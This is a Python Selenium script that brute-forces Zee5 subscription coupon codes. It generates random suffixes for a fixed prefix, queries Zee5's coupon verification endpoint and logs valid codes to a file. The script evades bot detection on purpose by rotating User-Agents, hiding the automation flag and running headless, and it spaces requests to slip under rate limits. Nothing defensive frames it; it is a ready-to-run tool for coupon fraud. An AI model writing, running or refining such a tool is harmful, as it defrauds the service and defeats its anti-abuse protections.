from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import random
import string
import time

# Rotate different User-Agent strings to bypass bot detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
]

def generate_random_code():
    """Generates a random Zee5 coupon code."""
    code_prefix = "Z5APCP25Y"  # Ensure this prefix is correct
    random_suffix = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    return f"{code_prefix}{random_suffix}"

def setup_browser():
    """Sets up Selenium WebDriver with random User-Agent."""
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Runs in the background (no GUI)
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")  # Prevents detection
    chrome_options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")  # Random User-Agent
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")

    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=chrome_options)
    return driver

def verify_coupon():
    """Opens Zee5 website in a browser and checks if the coupon is valid."""
    driver = setup_browser()
    
    try:
        code = generate_random_code()
        url = f"https://securepayment.zee5.com/paymentGateway/coupon/verification?coupon_code={code}&translation=en&country_code=IN"
        
        print(f"Checking code: {code}")
        driver.get(url)
        time.sleep(5)  # Wait for page to load

        # Extract page content (if Zee5 displays success/failure messages)
        page_source = driver.page_source
        if "Coupon code applied successfully" in page_source:
            print(f"[âœ”] Valid Code: {code}")
            with open("zee5code.txt", "a") as file:
                file.write(f"Valid Code: {code}\n")
        else:
            print(f"[âœ˜] Invalid Code: {code}")

    except Exception as e:
        print(f"[!] Error: {e}")
    
    finally:
        driver.quit()  # Close browser session

if __name__ == "__main__":
    num_codes = int(input("Enter the number of codes to generate: "))
    for _ in range(num_codes):
        verify_coupon()
        time.sleep(3)  # Prevents rate limiting
